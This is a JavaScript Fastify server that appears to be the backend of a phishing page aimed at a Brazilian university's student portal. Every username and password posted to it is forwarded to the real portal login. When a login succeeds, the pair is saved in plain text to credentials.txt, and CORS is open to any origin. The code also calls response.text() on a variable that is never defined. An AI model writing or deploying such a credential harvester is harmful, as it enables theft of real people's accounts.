import fastify from "fastify";
import cors from "@fastify/cors";
import fs from "fs";

const server = fastify();

server.register(cors, {
  origin: "*",
});

function writeToFile(data) {
  fs.writeFile("./credentials.txt", data, (err) => {
    if (err) {
      console.error(err);
    }
  });
}

server.post("/", async (request, reply) => {
  const { user, password } = JSON.parse(request.body);

  const data = new FormData();

  data.append("UserName", user);
  data.append("Password", password);
  data.append("RememberMe", "false");

  fetch("https://meu.ifmg.edu.br/EducaMobile/Account/Login", {
    method: "POST",
    body: data,
  })
    .then((response) => response.text())
    .then((text) => {
      console.log(text.length);
      if (text.length == 5597) {
        const content = `${user} ${password}\n`;

        writeToFile(content);

        console.log("Login realizado com sucesso!");
      } else {
        console.log("Erro ao realizar login, tente novamente!");
      }
    })
    .catch((error) => console.error(error));

  console.log(response.text());

  return { user, password };
});

server.listen({ port: 4000 }).then((address) => {
  console.log(`Server listening on ${address}`);
});
